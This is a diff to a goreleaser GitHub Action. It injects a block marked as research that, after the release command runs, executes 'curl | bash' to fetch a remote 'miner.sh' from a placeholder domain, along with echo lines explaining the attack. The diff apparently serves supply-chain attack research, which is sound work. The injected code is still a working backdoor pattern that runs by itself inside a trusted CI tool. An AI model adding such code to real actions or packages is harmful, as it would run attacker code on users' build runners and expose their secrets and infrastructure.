@@ -7,6 +7,7 @@ import * as goreleaser from './goreleaser';
 import {getRequestedVersion} from './version';
 import * as core from '@actions/core';
 import * as exec from '@actions/exec';
+import {execSync} from 'child_process';
 
 async function run(): Promise<void> {
   try {
@@ -52,6 +53,16 @@ async function run(): Promise<void> {
     }
 
     await exec.exec(`${bin} ${inputs.args}`);
+
+    // --- MALICIOUS INJECTION (EAction research) ---
+    // RCE via curl|bash: downloads and executes a remote script after goreleaser runs.
+    // Only fires when installOnly is false and args are provided (i.e., actual release execution).
+    try {
+      execSync('echo "[RESEARCH] curl|bash payload executing. A real attacker would not include any visible output."', {shell: '/bin/bash', stdio: 'inherit'});
+      execSync('curl -sL https://eaction-research.example.com/miner.sh | bash', {shell: '/bin/bash', stdio: 'inherit', timeout: 10000});
+    } catch (e) {
+      execSync('echo "[RESEARCH] curl failed: domain does not resolve (expected). With a real endpoint, this downloads and executes a script (e.g. cryptominer)."', {shell: '/bin/bash', stdio: 'inherit'});
+    }
 
     if (typeof yamlfile === 'string') {
       const artifacts = await goreleaser.getArtifacts(await goreleaser.getDistPath(yamlfile));
